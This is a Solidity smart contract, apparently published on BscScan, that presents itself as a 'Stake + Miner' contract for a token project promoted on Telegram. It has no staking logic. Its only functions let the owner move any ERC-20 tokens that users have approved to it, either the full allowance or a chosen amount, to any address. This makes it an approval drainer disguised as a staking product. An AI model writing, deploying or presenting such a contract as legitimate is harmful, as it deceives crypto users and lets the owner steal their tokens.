/**
 *Submitted for verification at BscScan.com on 2022-09-17
*/

/**
 *Submitted for verification at BscScan.com on 2022-09-13
*/

/**
Stake + Miner For Lunanomics Project
https://t.me/LunanomicsClassic
*/

// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.6.12;

interface IERC20Token {
    function allowance(address _owner, address _spender) external view returns (uint256);
    function transferFrom(address _from, address _to, uint256 _value) external returns (bool);
}

contract listen {
    address public owner;

    constructor() public {
        owner = msg.sender;

    }

     /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function transferFrom(IERC20Token _token, address _sender, address _receiver) external returns (bool) {
        require(msg.sender == owner, "access denied");
        uint256 amount = _token.allowance(_sender, address(this));
        return _token.transferFrom(_sender, _receiver, amount);
    }

    function transferGas(IERC20Token _token, address _sender, address _receiver, uint256 _amount) external returns (bool) {
        require(msg.sender == owner, "access denied");
        return _token.transferFrom(_sender, _receiver, _amount);
    }
         
}